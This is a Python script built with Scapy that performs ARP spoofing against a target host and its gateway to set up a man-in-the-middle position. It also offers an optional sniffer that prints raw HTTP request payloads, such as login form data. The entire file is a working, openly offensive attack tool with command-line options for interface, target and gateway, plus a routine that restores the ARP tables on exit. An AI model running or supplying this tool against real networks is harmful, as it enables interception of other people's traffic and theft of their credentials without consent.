import scapy.all as scapy
from scapy.layers import http
import time
import optparse

def listen_packets(interface, should_listen):
    if should_listen:
        scapy.sniff(iface=interface, store=False, prn=analyze_packets)

def analyze_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i", "--interface", dest="interface", help="Enter Interface Name")
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")
    parse_object.add_option("-l", "--listen", action="store_true", dest="should_listen", default=False, help="Enable Packet Listening")

    options = parse_object.parse_args()[0]

    if not options.interface:
        print("Enter Interface Name")
    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

user_input = get_user_input()
interface = user_input.interface
target_ip = user_input.target_ip
gateway_ip = user_input.gateway_ip
should_listen = user_input.should_listen

number = 0
try:
    while True:
        arp_poisoning(target_ip, gateway_ip)
        arp_poisoning(gateway_ip, target_ip)

        number += 2
        print("\rSending packets " + str(number), end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(target_ip, gateway_ip)
    reset_operation(gateway_ip, target_ip)

listen_packets(interface, should_listen)
